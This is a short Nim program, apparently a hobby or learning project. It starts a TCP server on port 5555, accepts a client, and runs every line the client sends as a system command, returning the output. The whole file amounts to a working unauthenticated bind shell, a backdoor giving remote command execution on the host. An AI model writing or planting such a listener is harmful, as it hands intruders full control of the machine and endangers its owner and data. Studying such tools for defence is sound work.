import net
import std/osproc
#import std/parseopt


# would like to parse eventually, that is not today though
#var p = initOptParser("-ab -e:5 --foo --bar=20 file.txt")

# Setting up the server params

let portNum: int = 5555
let server: Socket = newSocket()
server.bindAddr(Port(portNum))

# Starting Server
server.listen()
stdout.writeLine("Server: started. Listening to new connections on port 5555 ... ")

var client: Socket = new(Socket)
server.accept(client)
stdout.writeLine("Server: client connected")

while true:
  let message: string = client.recvLine()


  if message == "":
      break

  stdout.writeLine("Server: received command: ", message)

  let command: string = execProcess(message)
  stdout.writeLine("Server: command output: ", command)
  client.send(command & "\r\L")
  



server.close()
stdout.writeLine("Server: closed.")

var consoleInput = readLine(stdin);
